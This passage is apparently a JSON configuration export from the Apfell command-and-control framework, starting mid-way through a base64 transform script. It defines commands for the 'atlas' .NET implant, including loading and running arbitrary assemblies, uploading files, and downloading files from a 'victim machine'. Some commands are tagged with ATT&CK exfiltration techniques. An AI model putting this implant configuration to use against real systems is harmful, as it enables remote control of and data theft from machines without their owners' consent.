YWV9VU0VSJScsIHNlbGYuc2F2ZWRfYXJyYXlbN10pCiAgICBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs4XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==","name":"atlas_stamp_parameters","parameter_type":"None","description":"Stamp in parameters for Atlas payload","is_command_code":false,"timestamp":"03\/02\/2020 04:31:13","id":16,"operator":"apfell_admin"}],"commands":[{"needs_admin":false,"help_cmd":"jobs","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Retrieve a list of currently running jobs","cmd":"jobs","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"listloaded","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Retrieve a list of .NET assemblies loaded via the loadassembly command. ","cmd":"listloaded","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"jobkill [job id]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Kills a running job and removes it from the atlas instance's list of running jobs.","cmd":"jobkill","parameters":[{"type":"String","hint":"The Job Id for the running job to be killed","choices":"","required":true,"name":"job_id"}],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"","cmd":"config","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"runassembly [filename] [assembly arguments]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.","cmd":"runassembly","parameters":[{"type":"String","hint":"","choices":"","required":true,"name":"assembly_id"},{"type":"String","hint":"","choices":"","required":false,"name":"args"}],"attack":[],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"runassembly","command_id":102,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"runassembly","command_id":102,"payload_type":"atlas","transform":"atlas_runassembly_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"exit","version":1,"is_exit":true,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"This exits the current atlas instance by leveraging the Environment.Exit class method.","cmd":"exit","parameters":[],"attack":[],"artifacts":[],"files":[],"transforms":[]},{"needs_admin":false,"help_cmd":"upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Take a file from the database and store it on disk through the callback.","cmd":"upload","parameters":[{"type":"File","hint":"","choices":"","required":true,"name":"assembly_id"},{"type":"String","hint":"Path to save the remote file too (default is current directory)","choices":"","required":true,"name":"remote_path"}],"attack":[{"t_num":"T1132","attack_name":"Data Encoding"},{"t_num":"T1030","attack_name":"Data Transfer Size Limits"},{"t_num":"T1041","attack_name":"Exfiltration Over Command and Control Channel"}],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"upload","command_id":104,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"upload","command_id":104,"payload_type":"atlas","transform":"atlas_upload_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"loadassembly [assembly filename]","version":2,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":false,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file","cmd":"loadassembly","parameters":[{"type":"File","hint":"","choices":"","required":true,"name":"assembly_id"}],"attack":[],"artifacts":[],"files":[],"transforms":[{"order":2,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"loadassembly","command_id":105,"payload_type":"atlas","transform":"swap_shortnames","parameter_type":"None"},{"order":1,"parameter":"","active":true,"description":"","timestamp":"03\/02\/2020 03:40:15","command":"loadassembly","command_id":105,"payload_type":"atlas","transform":"atlas_loadassembly_shorthand","parameter_type":"None"}]},{"needs_admin":false,"help_cmd":"download [path to remote file]","version":1,"is_exit":false,"is_file_browse":false,"file_browse_parameters":"*","is_process_list":false,"process_list_parameters":"","is_download_file":true,"download_file_parameters":"*","is_remove_file":false,"remove_file_parameters":"*","is_agent_generator":false,"author":"","deleted":false,"description":"Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}","cmd":"download","parameters":[{"type":"String","hint":"Path to remote file to be downloaded","choices":"","required":true,"name":"file_path"}],"attack":[],"artifacts":[],"files":[],"transforms":[]}]}]}